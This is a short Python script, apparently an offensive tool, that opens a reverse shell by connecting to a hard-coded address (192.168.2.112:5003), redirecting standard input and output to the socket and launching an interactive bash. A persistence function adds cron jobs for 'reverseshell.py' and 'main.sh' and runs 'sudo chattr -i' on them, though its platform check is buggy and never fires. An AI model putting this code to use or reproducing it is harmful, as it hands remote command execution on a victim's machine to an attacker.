#!/usr/bin/env

def persistence_job():
    
    from subprocess import run
    import platform
    import time
    import os
    os.system('clear')

    if platform == "linux" or platform == "linux2":
        try:
            FILE_CHECK = os.path.exists("reverseshell_self.py")
            if FILE_CHECK == True:
                run(f"echo '37 13 * * * reverseshell.py' | crontab -e", shell=True)
                os.system('sudo chattr -i reverseshell.py')
                time.sleep(1)
                run(f"echo '37 13 * * * main.sh' | crontab -e", shell=True)
                os.system('sudo chattr -i main.sh')
                time.sleep(1)
            
        except FileNotFoundError:
            run(f"echo '01 08 * * * /usr/bin/reverseshell.py' | crontab -e", shell=True)
            os.system('sudo chattr -i /usr/bin/reverseshell.py')
            time.sleep(1)
            run(f"echo '01 08 * * * /usr/bin/main.sh' | crontab -e", shell=True)
            os.system('sudo chattr -i /usr/bin/main.sh')
            time.sleep(1)
                
        os.system('clear')
            
    else:
        pass

class shell:
    
    def __init__(self, TARGET_IPADDRESS, TARGET_PORT):
        self.TARGET_IPADDRESS = TARGET_IPADDRESS
        self.TARGET_PORT = TARGET_PORT
        
REVERSE_CONNECTION = shell("192.168.2.112", int(5003))

from subprocess import run
from os import dup2
import socket
import os

os.system('clear')
# Change socket.SOCK_STREM(TCP) to socket.SOCK_DRAM for UDP connection
SOCKET_SOCK = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
SOCKET_SOCK.connect((REVERSE_CONNECTION.TARGET_IPADDRESS, REVERSE_CONNECTION.TARGET_PORT))

dup2(SOCKET_SOCK.fileno(),0)
dup2(SOCKET_SOCK.fileno(),1)
dup2(SOCKET_SOCK.fileno(),2)
run(["/bin/bash","-i"])   
